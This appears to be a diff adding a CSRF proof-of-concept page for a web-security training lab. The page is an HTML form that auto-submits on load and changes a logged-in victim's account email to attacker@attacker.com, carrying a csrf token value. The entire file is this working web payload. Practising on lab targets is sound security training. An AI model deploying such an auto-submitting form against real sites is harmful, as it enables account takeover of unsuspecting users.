@@ -1,0 +1,17 @@
+<html>
+   <form enctype="application/x-www-form-urlencoded" action="https://0a3a0060030dd42c82e3ab4900b300fc.web-security-academy.net/my-account/change-email" method="POST">
+      <table>
+         <tr>
+            <td>email</td>
+            <td><input type="text" value="attacker@attacker.com" name="email"></td>
+         </tr>
+         <tr>
+            <td>csrf</td>
+            <td><input type="text" value="H0seJwlPAfREQwu8FcwQAxwNtb0n2kKo" name="csrf"></td>
+         </tr>
+      </table>
+   </form>
+   <script>
+        document.forms[0].submit();
+   </script>
+</html>
